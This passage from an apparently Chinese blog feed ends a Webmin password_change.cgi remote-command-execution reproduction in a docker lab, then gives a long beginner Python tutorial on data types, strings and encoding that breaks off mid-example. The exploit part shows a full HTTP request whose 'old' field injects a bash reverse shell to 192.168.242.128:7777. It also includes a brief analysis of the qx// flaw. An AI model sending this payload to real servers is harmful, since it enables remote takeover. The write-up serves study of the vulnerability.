<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /password_change.cgi HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">88.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">88.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">119</span></span><br><span class="line">Origin: http://<span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span></span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span>/session_login.cgi</span><br><span class="line">Cookie: redirect=<span class="number">1</span>; testing=<span class="number">1</span>; sid=x</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">user=test&amp;pam=<span class="number">1</span>&amp;expired=<span class="number">2</span>&amp;old=bash -c %22bash -i %3E%<span class="number">26</span> %2Fdev%2Ftcp%2F192<span class="number">.168</span><span class="number">.242</span><span class="number">.128</span>%2F7777 <span class="number">0</span>%3E%<span class="number">261</span>%<span class="number">22</span>&amp;new1=<span class="number">1</span>&amp;new2=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/07/r53vgBPSaNL9cZm.png" alt="image-20210507113059097"></p>
<p>成功getshell。</p>
<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>查看<code>password_change.cgi</code>文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line">ls //可以发现在/usr/share/webmin目录下有password_change.cgi文件。</span><br><span class="line">cat password_change.cgi</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/07/ZLexRIfop2Q8wkG.png" alt="image-20210507124715407"></p>
<p><code>$in&#123;&#39;old&#39;&#125;</code>参数被<code>qx/ /</code>包裹，于是<code>old</code>参数的值将会被执行，而<code>old</code>可以从外部传参，就造成了命令执行漏洞。</p>
<p>详细分析看这个：<a href="https://blog.csdn.net/whatday/article/details/106978162">https://blog.csdn.net/whatday/article/details/106978162</a></p>
<p>关闭镜像：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>



<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul>
<li><a href="https://paper.seebug.org/1019/">https://paper.seebug.org/1019/</a></li>
<li><a href="https://blog.csdn.net/whatday/article/details/106978162">https://blog.csdn.net/whatday/article/details/106978162</a></li>
<li><a href="https://www.dazhuanlan.com/2019/10/24/5db1ac1aedbb9/%EF%BC%88%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%82%B9%EF%BC%89">https://www.dazhuanlan.com/2019/10/24/5db1ac1aedbb9/（找漏洞点）</a></li>
<li><a href="https://blog.csdn.net/EC_Carrot/article/details/114300857%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AE%89%E8%A3%85nc%E5%92%8Cgetshell%EF%BC%89">https://blog.csdn.net/EC_Carrot/article/details/114300857（命令执行安装nc和getshell）</a></li>
<li><a href="https://www.jianshu.com/p/6db98793d043%EF%BC%88getshell%EF%BC%89">https://www.jianshu.com/p/6db98793d043（getshell）</a></li>
<li><a href="https://www.cnblogs.com/charon1937/p/13757124.html%EF%BC%88%E5%AE%89%E8%A3%85docker%E5%92%8Cvulhub%EF%BC%89">https://www.cnblogs.com/charon1937/p/13757124.html（安装docker和vulhub）</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>python基础</title>
    <url>/2021/03/25/python%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h5 id="一、运行"><a href="#一、运行" class="headerlink" title="一、运行"></a>一、运行</h5><p>Mac和Linux可以直接运行<code>.py</code>文件，方法是在<code>.py</code>文件的第一行加上一句注释。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;hello world!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后，通过命令给<code>hello.py</code>以执行权限：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod a+x hello.py</span><br></pre></td></tr></table></figure>



<h5 id="二、输入和输出"><a href="#二、输入和输出" class="headerlink" title="二、输入和输出"></a>二、输入和输出</h5><h6 id="2-1-输出"><a href="#2-1-输出" class="headerlink" title="2.1 输出"></a>2.1 输出</h6><p>多个字符串直接用逗号隔开。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;Lu is a pink pig.&#x27;</span>, <span class="string">&#x27;Yang is a ecat.&#x27;</span>, <span class="string">&#x27;Li a vegetable dog.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;1 + 1 =&#x27;</span>, <span class="number">1</span> + <span class="number">0</span>)</span><br></pre></td></tr></table></figure>



<h6 id="2-2-输入"><a href="#2-2-输入" class="headerlink" title="2.2 输入"></a>2.2 输入</h6><p>输入字符串并存放到变量里。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;please enter your friend name:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;hello,&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#input()返回的数据类型是str，用int()函数把str转换成整数</span></span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;birth: &#x27;</span>)</span><br><span class="line">birth = <span class="built_in">int</span>(s)</span><br></pre></td></tr></table></figure>



<h5 id="三、数据类型"><a href="#三、数据类型" class="headerlink" title="三、数据类型"></a>三、数据类型</h5><h6 id="3-1-整数"><a href="#3-1-整数" class="headerlink" title="3.1 整数"></a>3.1 整数</h6><p>十六进制用<code>0x</code>前缀和0-9，a-f表示，例如：<code>0xff00</code>，<code>0xa5b4c3d2</code>，等等。</p>
<p>对于很大的数，例如<code>10000000000</code>，很难数清楚0的个数。Python允许在数字中间以<code>_</code>分隔，因此，写成<code>10_000_000_000</code>和<code>10000000000</code>是完全一样的。十六进制数也可以写成<code>0xa1b2_c3d4</code>。</p>
<h6 id="3-2-浮点数"><a href="#3-2-浮点数" class="headerlink" title="3.2 浮点数"></a>3.2 浮点数</h6><p>浮点数可以用数学写法，如<code>1.23</code>，<code>3.14</code>，<code>-9.01</code>，等等。但是对于很大或很小的浮点数，就必须用科学计数法表示，把10用e替代，1.23x10<sup>9</sup> 就是<code>1.23e9</code>，或者<code>12.3e8</code>，0.000012可以写成<code>1.2e-5</code>，等等。</p>
<blockquote>
<p>整数和浮点数在计算机内部存储的方式是不同的，整数运算永远是精确的，而浮点数运算则可能会有四舍五入的误差。</p>
</blockquote>
<p>在Python中，有两种除法，一种除法是<code>/</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> / <span class="number">3</span></span><br><span class="line"><span class="number">3.3333333333333335</span></span><br></pre></td></tr></table></figure>

<p><code>/</code>除法计算结果是浮点数，即使是两个整数恰好整除，结果也是浮点数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">9</span> / <span class="number">3</span></span><br><span class="line"><span class="number">3.0</span></span><br></pre></td></tr></table></figure>

<p>还有一种除法是<code>//</code>，称为地板除，两个整数的除法仍然是整数，即使除不尽：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> // <span class="number">3</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>取余<code>%</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> % <span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>无论整数做<code>//</code>除法还是取余数，结果永远是整数，所以，整数运算结果永远是精确的。</p>
<h6 id="3-3-字符串"><a href="#3-3-字符串" class="headerlink" title="3.3 字符串"></a>3.3 字符串</h6><p>字符串是以单引号<code>&#39;</code>或双引号<code>&quot;</code>括起来的任意文本，如果<code>&#39;</code>本身也是一个字符，那就可以用<code>&quot;&quot;</code>括起来，比如<code>&quot;I&#39;m OK&quot;</code>包含的字符是<code>I</code>，<code>&#39;</code>，<code>m</code>，空格，<code>O</code>，<code>K</code>这6个字符。如果字符串内部既包含<code>&#39;</code>又包含<code>&quot;</code>，可以用转义字符<code>\</code>来标识，比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;I\&#x27;m \&quot;OK\&quot;!&#x27;</span></span><br></pre></td></tr></table></figure>

<p>表示的字符串内容是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I&#39;m &quot;OK&quot;!</span><br></pre></td></tr></table></figure>

<p>转义字符<code>\</code>可以转义很多字符，比如<code>\n</code>表示换行，<code>\t</code>表示制表符，字符<code>\</code>本身也要转义。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="string">&#x27;I\&#x27;m ok.&#x27;</span>)</span><br><span class="line">I<span class="string">&#x27;m ok.</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; print (&quot;&#x27;</span>ymm<span class="string">&#x27;yyds! \n 带带我！&quot;)</span></span><br><span class="line"><span class="string">&#x27;</span>ymm<span class="string">&#x27;yyds!</span></span><br><span class="line"><span class="string"> 带带我！</span></span><br></pre></td></tr></table></figure>

<p>Python还允许用<code>r&#39;&#39;</code>表示<code>&#39;&#39;</code>内部的字符串默认不转义。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="string">&#x27;\\\n\\&#x27;</span>)</span><br><span class="line">\</span><br><span class="line">\</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="string">r&#x27;\\\n\\&#x27;</span>)</span><br><span class="line">\\\n\\</span><br></pre></td></tr></table></figure>

<p>如果字符串内部有很多换行，用<code>\n</code>写在一行里不好阅读，为了简化，Python允许用<code>&#39;&#39;&#39;...&#39;&#39;&#39;</code>的格式表示多行内容。在交互式命令行内输入多行内容时，<u>提示符</u>由<code>&gt;&gt;&gt;</code>变为<code>...</code>，提示你可以接着上一行输入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="string">&#x27;&#x27;&#x27;yzyyds!</span></span><br><span class="line"><span class="string"><span class="meta">... </span>llyyds!</span></span><br><span class="line"><span class="string"><span class="meta">... </span>我是菜狗！&#x27;&#x27;&#x27;</span>)</span><br><span class="line">yzyyds!</span><br><span class="line">llyyds!</span><br><span class="line">我是菜狗！</span><br></pre></td></tr></table></figure>



<h6 id="3-4-布尔值"><a href="#3-4-布尔值" class="headerlink" title="3.4 布尔值"></a>3.4 布尔值</h6><p>在Python中，可以直接用<code>True</code>、<code>False</code>表示布尔值（严格区分大小写），也可以通过布尔运算计算出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>true</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;true&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span> &lt; <span class="number">2</span></span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>布尔值可以用<code>and</code>、<code>or</code>和<code>not</code>运算。</p>
<p><code>and</code>运算是与运算，只有所有都为<code>True</code>，<code>and</code>运算结果才是<code>True</code>。</p>
<p><code>or</code>运算是或运算，只要其中有一个为<code>True</code>，<code>or</code>运算结果就是<code>True</code>。</p>
<p><code>not</code>运算是非运算，它是一个单目运算符，把<code>True</code>变成<code>False</code>，<code>False</code>变成<code>True</code>。</p>
<p>布尔值经常用在条件判断中，比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="built_in">eval</span> (<span class="built_in">input</span> (<span class="string">&#x27;请输入年龄：&#x27;</span>)) <span class="comment">#eval():自动类型转换。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">	<span class="built_in">print</span> (<span class="string">&quot;恭喜你解除了防沉迷！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span> (<span class="string">&quot;you are so young.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">D:\code\python&gt;python test.py</span><br><span class="line">请输入年龄：<span class="number">5</span></span><br><span class="line">you are so young.</span><br><span class="line"></span><br><span class="line">D:\code\python&gt;python test.py</span><br><span class="line">请输入年龄：<span class="number">19</span></span><br><span class="line">恭喜你解除了防沉迷！</span><br></pre></td></tr></table></figure>



<h6 id="3-5-空值"><a href="#3-5-空值" class="headerlink" title="3.5 空值"></a>3.5 空值</h6><p>空值是Python里一个特殊的值，用<code>None</code>表示。<code>None</code>不能理解为<code>0</code>，因为<code>0</code>是有意义的，而<code>None</code>是一个特殊的空值。</p>
<h5 id="四、变量及常量"><a href="#四、变量及常量" class="headerlink" title="四、变量及常量"></a>四、变量及常量</h5><h6 id="4-1-变量"><a href="#4-1-变量" class="headerlink" title="4.1 变量"></a>4.1 变量</h6><p>变量名必须是大小写英文、数字和<code>_</code>的组合，且不能用数字开头。</p>
<p>在Python中，<code>=</code>是赋值语句，可以把任意数据类型赋值给变量，同一个变量可以反复赋值，而且可以是不同类型的变量。</p>
<p>python这种变量本身类型不固定的语言称之为<font color=#FF0000> 动态语言 </font>，与之对应的是<font color=#FF0000>  静态语言 </font>。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。</p>
<p>当我们写：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;ABC&#x27;</span></span><br></pre></td></tr></table></figure>

<p>时，Python解释器干了两件事情：</p>
<ol>
<li>在内存中创建了一个<code>&#39;ABC&#39;</code>的字符串；</li>
<li>在内存中创建了一个名为<code>a</code>的变量，并把它指向<code>&#39;ABC&#39;</code>。</li>
</ol>
<p>也可以把一个变量<code>a</code>赋值给另一个变量<code>b</code>，这个操作实际上是把变量<code>b</code>指向变量<code>a</code>所指向的数据。</p>
<h6 id="4-2-常量"><a href="#4-2-常量" class="headerlink" title="4.2 常量"></a>4.2 常量</h6><p>常量就是不能变的变量，比如常用的数学常数π就是一个常量。在Python中，通常用全部大写的变量名表示常量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PI &#x3D; 3.14159265359</span><br></pre></td></tr></table></figure>

<p>但事实上<code>PI</code>仍然是一个变量，Python根本没有任何机制保证<code>PI</code>不会被改变，所以，用全部大写的变量名表示常量只是一个习惯上的用法。</p>
<h5 id="五、字符串和编码"><a href="#五、字符串和编码" class="headerlink" title="五、字符串和编码"></a>五、字符串和编码</h5><h6 id="5-1-字符编码"><a href="#5-1-字符编码" class="headerlink" title="5.1 字符编码"></a>5.1 字符编码</h6><p>最早的计算机在设计时采用8个比特（bit）作为一个字节（byte），所以，一个字节能表示的最大的整数就是255（二进制11111111=十进制255），如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是<code>65535</code>。</p>
<p>最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为<font color=#FF0000>  ASCII编码</font>。</p>
<p>但是要处理中文至少需要两个字节，而且还不能和ASCII编码冲突，所以，中国制定了<code>GB2312</code>编码，用来把中文编进去。日本把日文编到<code>Shift_JIS</code>里，韩国把韩文编到<code>Euc-kr</code>里，各国有各国的标准，于是产生了乱码问题。</p>
<p><font color=#FF0000>  Unicode字符集</font>把所有语言都统一到一套编码里，以解决乱码问题。</p>
<p>Unicode最常用的是UCS-16编码，用两个字节表示一个字符（如果要用到非常偏僻的字符，就需要4个字节）。现代操作系统和大多数编程语言都直接支持Unicode。</p>
<p>ASCII编码和Unicode编码的区别：ASCII编码是1个字节，而Unicode编码通常是2个字节。</p>
<p>如果把ASCII编码的字符用Unicode编码，只需要在其二进制前面补0。</p>
<p>弊端：用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。</p>
<p>所以，又出现了把Unicode编码转化为“可变长编码”的<font color=#FF0000>  UTF-8编码</font>。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">ASCII</th>
<th align="left">Unicode</th>
<th align="left">UTF-8</th>
</tr>
</thead>
<tbody><tr>
<td align="left">A</td>
<td align="left">01000001</td>
<td align="left">00000000 01000001</td>
<td align="left">01000001</td>
</tr>
<tr>
<td align="left">中</td>
<td align="left">x</td>
<td align="left">01001110 00101101</td>
<td align="left">11100100 10111000 10101101</td>
</tr>
</tbody></table>
<p>且ASCII编码实际上可以被看成是UTF-8编码的一部分。</p>
<p>现在计算机系统通用的字符编码工作方式：</p>
<p>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。</p>
<p><img src="https://www.liaoxuefeng.com/files/attachments/923923787018816/0" alt="rw-file-utf-8"></p>
<p><img src="https://www.liaoxuefeng.com/files/attachments/923923759189600/0" alt="web-utf-8"></p>
<p>所以很多网页的源码上会有类似<code>&lt;meta charset=&quot;UTF-8&quot; /&gt;</code>的信息，表示该网页正是用的UTF-8编码。</p>
<h6 id="5-2-python的字符串"><a href="#5-2-python的字符串" class="headerlink" title="5.2 python的字符串"></a>5.2 python的字符串</h6><p>在最新的Python 3版本中，字符串是以Unicode编码的，即Python的字符串支持多语言，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="string">&#x27;陆陆 is a pink pig&#x27;</span>)</span><br><span class="line">陆陆 <span class="keyword">is</span> a pink pig</span><br></pre></td></tr></table></figure>

<p>对于单个字符的编码，Python提供了<code>ord()</code>函数获取字符的整数表示，<code>chr()</code>函数把编码转换为对应的字符：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="number">65</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">ord</span>(<span class="string">&#x27;中&#x27;</span>)</span><br><span class="line"><span class="number">20013</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">66</span>)</span><br><span class="line"><span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">25991</span>)</span><br><span class="line"><span class="string">&#x27;文&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果知道字符的整数编码，还可以用十六进制这么写<code>str</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;\u4e2d\u6587&#x27;</span></span><br><span class="line"><span class="string">&#x27;中文&#x27;</span></span><br></pre></td></tr></table></figure>

<p>两种写法完全是等价的。</p>
<p>由于Python的字符串类型是<code>str</code>，在内存中以Unicode表示，一个字符对应若干个字节。如果要在网络上传输，或者保存到磁盘上，就需要把<code>str</code>变为以字节为单位的<code>bytes</code>。</p>
<p>Python对<code>bytes</code>类型的数据用带<code>b</code>前缀的单引号或双引号表示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line">y = <span class="string">b&#x27;ABC&#x27;</span></span><br><span class="line"><span class="built_in">print</span> (x)</span><br><span class="line"><span class="built_in">print</span> (y)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ABC</span><br><span class="line">b&#39;ABC&#39;</span><br></pre></td></tr></table></figure>

<p>要注意区分<code>&#39;ABC&#39;</code>和<code>b&#39;ABC&#39;</code>，前者是<code>str</code>，后者虽然内容显示得和前者一样，但<code>bytes</code>的每个字符都只占用一个字节。</p>
<p>以Unicode表示的<code>str</code>通过<code>encode()</code>方法可以编码为指定的<code>bytes</code>，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;tql&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;tql&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;太强了&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\xe5\xa4\xaa\xe5\xbc\xba\xe4\xba\x86&#x27;</span> <span class="comment">#在`bytes`中，无法显示为ASCII字符的字节，用`\x##`显示。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;太强了&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-2: ordinal not in range(128)</span></span><br></pre></td></tr></table></figure>

<p>纯英文的<code>str</code>可以用<code>ASCII</code>编码为<code>bytes</code>，内容是一样的，含有中文的<code>str</code>可以用<code>UTF-8</code>编码为<code>bytes</code>。含有中文的<code>str</code>无法用<code>ASCII</code>编码，因为中文编码的范围超过了<code>ASCII</code>编码的范围，Python会报错。</p>
<p>反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是<code>bytes</code>。要把<code>bytes</code>变为<code>str</code>，就需要用<code>decode()</code>方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;tql&#x27;</span>.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;tql&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;\xe5\xa4\xaa\xe5\xbc\xba\xe4\xba\x86&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;太强了&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果<code>bytes</code>中包含无法解码的字节，<code>decode()</code>方法会报错。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">UnicodeDecodeError: <span class="string">&#x27;utf-8&#x27;</span> codec can<span class="string">&#x27;t decode byte 0xff in position 3: invalid start byte</span></span><br></pre></td></tr></table></figure>

<p>如果<code>bytes</code>中只有一小部分无效的字节，可以传入<code>errors=&#39;ignore&#39;</code>忽略错误的字节：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;中&#x27;</span></span><br></pre></td></tr></table></figure>

<p>要计算<code>str</code>包含多少个字符，可以用<code>len()</code>函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">&#x27;ABC&#x27;</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">&#x27;中文&#x27;</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><code>len()</code>函数计算的是<code>str</code>的字符数，如果换成<code>bytes</code>，<code>len()</code>函数就计算字节数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">b&#x27;ABC&#x27;</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>在操作字符串时，我们经常遇到<code>str</code>和<code>bytes</code>的互相转换。为了避免乱码问题，应当始终坚持使用<font color=#FF0000>  UTF-8编码 </font>对<code>str</code>和<code>bytes</code>进行转换。</p>
<p>当Python解释器读取源代码时，为了让它按UTF-8编码读取，我们通常在文件开头写上这两行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">	<span class="comment">#告诉Linux/OS X系统，这是一个Python可执行程序，Windows系统会忽略这个注释</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">	<span class="comment">#告诉Python解释器，按照UTF-8编码读取源代码，防止源代码中的中文输出乱码。</span></span><br></pre></td></tr></table></figure>

<p>除此之外，必须要确保文本编辑器正在使用UTF-8 without BOM编码。</p>
<h6 id="5-3-格式化"><a href="#5-3-格式化" class="headerlink" title="5.3 格式化"></a>5.3 格式化</h6><p><code>%</code>运算符：用来格式化字符串。有几个<code>%?</code>占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个<code>%?</code>，括号可以省略。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%s yyds!&#x27;</span> % <span class="string">&#x27;ll&#x27;</span></span><br><span class="line"><span class="string">&#x27;ll yyds!&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;乌乌，%s 和 %s 是天才吗&#x27;</span> % (<span class="string">&#x27;陆陆&#x27;</span>, <span class="string">&#x27;羊总&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;乌乌，陆陆 和 羊总 是天才吗&#x27;</span></span><br></pre></td></tr></table></figure>

<p>常见的占位符有：</p>
<table>
<thead>
<tr>
<th align="left">占位符</th>
<th align="left">替换内容</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%d</td>
<td align="left">整数</td>
</tr>
<tr>
<td align="left">%f</td>
<td align="left">浮点数</td>
</tr>
<tr>
<td align="left">%s</td>
<td align="left">字符串</td>
</tr>
<tr>
<td align="left">%x</td>
<td align="left">十六进制整数</td>
</tr>
</tbody></table>
<p>其中，格式化整数和浮点数还可以指定是否补0和整数与小数的位数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;%d-%04d&#x27;</span> % (<span class="number">3</span>, <span class="number">1</span>))</span><br><span class="line"><span class="number">3</span>-0001</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;%2d-%04d&#x27;</span> % (<span class="number">3</span>, <span class="number">1</span>))</span><br><span class="line"> <span class="number">3</span>-0001</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;%.2f&#x27;</span> % <span class="number">3.1415926</span>)</span><br><span class="line"><span class="number">3.14</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;%6.02f&#x27;</span> % <span 